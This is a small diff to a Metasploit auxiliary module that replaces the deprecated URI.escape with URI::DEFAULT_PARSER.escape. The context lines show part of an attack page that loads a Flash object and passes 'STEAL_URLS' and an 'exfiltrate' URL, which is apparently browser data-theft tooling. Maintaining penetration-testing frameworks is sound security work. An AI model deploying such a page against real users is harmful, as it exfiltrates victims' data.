@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def exploit_html
-    ex_url = URI.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')
+    ex_url = URI::DEFAULT_PARSER.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')
     %Q|
       <!doctype html>
       <html>
@@ -104,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
           <object type="application/x-shockwave-flash" data="#{exploit_url(encoded_swf)}"
             width=500 height=500>
             <param name="FlashVars"
-              value="url=#{URI.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}" />
+              value="url=#{URI::DEFAULT_PARSER.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}" />
           </object>
         </body>
       </html>
